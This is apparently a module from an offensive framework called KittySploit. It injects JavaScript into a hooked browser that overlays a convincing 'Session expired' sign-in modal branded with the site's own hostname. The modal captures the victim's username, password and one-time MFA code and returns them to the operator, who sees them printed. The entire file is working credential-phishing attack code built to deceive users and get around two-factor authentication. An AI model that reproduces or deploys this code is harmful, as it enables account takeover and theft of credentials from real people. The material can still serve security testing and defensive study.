from kittysploit import *
import json
import uuid


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Fake Session Expired",
		"description": "Show a session-expired / re-auth modal to harvest credentials and optional MFA",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	brand = OptString("", "Brand/title override (empty = use document hostname)", False)
	message = OptString(
		"Your session has expired. Please sign in again to continue.",
		"Modal body message",
		False,
	)
	ask_mfa = OptBool(True, "Include MFA / OTP field", False)
	ask_username = OptBool(True, "Include username/email field", False)
	timeout = OptInteger(60, "Seconds to wait for form submission", False)
	theme = OptString("light", "Theme: light | dark", False)

	def run(self):
		brand = str(self.brand or "").strip()
		message = str(self.message or "Your session has expired. Please sign in again to continue.")
		ask_mfa = self._to_bool(self.ask_mfa)
		ask_username = self._to_bool(self.ask_username)
		timeout_s = max(5, int(self.timeout or 60))
		theme = str(self.theme or "light").strip().lower()
		if theme not in ("light", "dark"):
			theme = "light"
		job_id = str(uuid.uuid4())[:8]

		code_js = f"""
		(function() {{
			const BRAND = {json.dumps(brand)};
			const MESSAGE = {json.dumps(message)};
			const ASK_MFA = {str(ask_mfa).lower()};
			const ASK_USER = {str(ask_username).lower()};
			const TIMEOUT_MS = {timeout_s * 1000};
			const THEME = {json.dumps(theme)};
			const JOB = {json.dumps(job_id)};

			const existing = document.getElementById('ks-session-expired');
			if (existing) existing.remove();

			const dark = THEME === 'dark';
			const colors = dark ? {{
				bg: 'rgba(2,6,23,.82)', card: '#0f172a', text: '#f8fafc', muted: '#94a3b8',
				border: '#1e293b', inputBg: '#020617', accent: '#3b82f6'
			}} : {{
				bg: 'rgba(15,23,42,.55)', card: '#ffffff', text: '#0f172a', muted: '#64748b',
				border: '#e2e8f0', inputBg: '#f8fafc', accent: '#2563eb'
			}};

			return new Promise(function(resolve) {{
				let finished = false;
				function done(payload) {{
					if (finished) return;
					finished = true;
					try {{ root.remove(); }} catch (e) {{}}
					resolve(JSON.stringify(payload));
				}}

				const root = document.createElement('div');
				root.id = 'ks-session-expired';
				root.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:' + colors.bg +
					';display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,sans-serif;backdrop-filter:blur(4px);';

				const card = document.createElement('div');
				card.style.cssText = 'width:min(420px,92vw);background:' + colors.card + ';color:' + colors.text +
					';border:1px solid ' + colors.border + ';border-radius:14px;padding:28px 26px 22px;box-shadow:0 25px 50px rgba(0,0,0,.35);';

				const title = document.createElement('div');
				title.style.cssText = 'font-size:13px;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:' + colors.muted + ';margin-bottom:8px;';
				title.textContent = BRAND || (location.hostname || 'Secure sign-in');

				const heading = document.createElement('div');
				heading.style.cssText = 'font-size:22px;font-weight:700;margin-bottom:8px;';
				heading.textContent = 'Session expired';

				const body = document.createElement('p');
				body.style.cssText = 'margin:0 0 18px;font-size:14px;line-height:1.5;color:' + colors.muted + ';';
				body.textContent = MESSAGE;

				const form = document.createElement('form');
				form.style.cssText = 'display:flex;flex-direction:column;gap:12px;';

				function field(labelText, type, name, autocomplete) {{
					const wrap = document.createElement('label');
					wrap.style.cssText = 'display:flex;flex-direction:column;gap:6px;font-size:13px;font-weight:600;';
					wrap.textContent = labelText;
					const input = document.createElement('input');
					input.type = type;
					input.name = name;
					input.autocomplete = autocomplete || 'off';
					input.required = true;
					input.style.cssText = 'padding:11px 12px;border-radius:8px;border:1px solid ' + colors.border +
						';background:' + colors.inputBg + ';color:' + colors.text + ';font-size:14px;font-weight:400;';
					wrap.appendChild(input);
					return {{ wrap: wrap, input: input }};
				}}

				let userField = null;
				if (ASK_USER) {{
					userField = field('Email or username', 'text', 'username', 'username');
					form.appendChild(userField.wrap);
				}}
				const passField = field('Password', 'password', 'password', 'current-password');
				form.appendChild(passField.wrap);

				let mfaField = null;
				if (ASK_MFA) {{
					mfaField = field('Authentication code', 'text', 'otp', 'one-time-code');
					mfaField.input.inputMode = 'numeric';
					mfaField.input.placeholder = '123 456';
					form.appendChild(mfaField.wrap);
				}}

				const submit = document.createElement('button');
				submit.type = 'submit';
				submit.textContent = 'Sign in';
				submit.style.cssText = 'margin-top:6px;padding:12px;border:0;border-radius:8px;background:' +
					colors.accent + ';color:#fff;font-weight:600;font-size:14px;cursor:pointer;';
				form.appendChild(submit);

				const dismiss = document.createElement('button');
				dismiss.type = 'button';
				dismiss.textContent = 'Continue without signing in';
				dismiss.style.cssText = 'margin-top:4px;padding:8px;border:0;background:transparent;color:' +
					colors.muted + ';font-size:12px;cursor:pointer;';
				dismiss.addEventListener('click', function() {{
					done({{
						ok: true, submitted: false, dismissed: true, job: JOB,
						page_url: location.href, brand: title.textContent
					}});
				}});

				form.addEventListener('submit', function(ev) {{
					ev.preventDefault();
					done({{
						ok: true,
						submitted: true,
						dismissed: false,
						job: JOB,
						page_url: location.href,
						brand: title.textContent,
						username: userField ? userField.input.value : null,
						password: passField.input.value,
						mfa: mfaField ? mfaField.input.value : null,
						ts: new Date().toISOString()
					}});
				}});

				card.appendChild(title);
				card.appendChild(heading);
				card.appendChild(body);
				card.appendChild(form);
				card.appendChild(dismiss);
				root.appendChild(card);
				document.documentElement.appendChild(root);
				setTimeout(function() {{
					(userField ? userField.input : passField.input).focus();
				}}, 50);

				setTimeout(function() {{
					done({{
						ok: true, submitted: false, timeout: true, job: JOB,
						page_url: location.href
					}});
				}}, TIMEOUT_MS);
			}});
		}})();
		"""

		print_status(f"Showing session-expired modal (wait up to {timeout_s}s)...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(timeout_s + 15))
		if not result:
			print_error("Failed to run fake session expired")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("Fake Session Expired")
		print_info(f"  Page: {data.get('page_url')}")

		if data.get("submitted"):
			print_success("Credentials submitted")
			if data.get("username") is not None:
				print_warning(f"  Username: {data.get('username')}")
			print_warning(f"  Password: {data.get('password')}")
			if data.get("mfa") is not None:
				print_warning(f"  MFA: {data.get('mfa')}")
			return True

		if data.get("dismissed"):
			print_status("User dismissed the modal")
			return True
		if data.get("timeout"):
			print_status("Timed out waiting for submission")
			return True

		print_info(json.dumps(data, indent=2))
		return True
